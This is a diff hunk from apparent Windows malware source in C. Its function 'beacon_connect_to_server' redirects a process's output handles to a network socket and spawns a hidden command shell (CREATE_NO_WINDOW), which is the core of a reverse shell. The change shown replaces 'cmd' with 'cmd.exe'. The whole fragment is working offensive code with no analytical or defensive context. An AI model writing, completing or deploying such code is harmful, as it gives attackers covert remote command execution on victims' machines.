@@ -99,7 +99,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
         sinfo.hStdOutput = (HANDLE)s;
         sinfo.hStdError = (HANDLE)s;
         PROCESS_INFORMATION pinfo;
-        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
         printf("HELP");
     } while( iResult >= 0 );
     
